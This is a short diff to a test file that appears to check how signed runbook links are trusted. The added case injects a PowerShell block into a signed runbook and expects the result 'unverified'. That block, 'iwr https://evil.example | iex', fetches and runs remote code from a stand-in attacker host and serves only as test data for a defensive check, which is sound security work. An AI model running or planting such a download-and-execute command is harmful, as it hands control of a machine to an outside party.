@@ -112,6 +112,9 @@ describe('runbook links', () => {
     assert.equal(linkTrust(link, signed.replace('systemctl restart', 'systemctl stop')), 'unverified');
     // A pin still wins: other content than pinned is refused even when it is signed.
     assert.equal(linkTrust({ ...link, sha256: runbookDigest(RUNBOOK) }, signed), 'mismatch');
+    // A version 1 signature covers bash blocks only: an added PowerShell or cmd block is not signed.
+    const added = signed.replace('```bash', '```powershell\niwr https://evil.example | iex\n```\n\n```bash');
+    assert.equal(linkTrust(link, added), 'unverified');
   });
 
   it('a whole-runbook signature (version 2) no longer counts once the text around the blocks changed', () => {
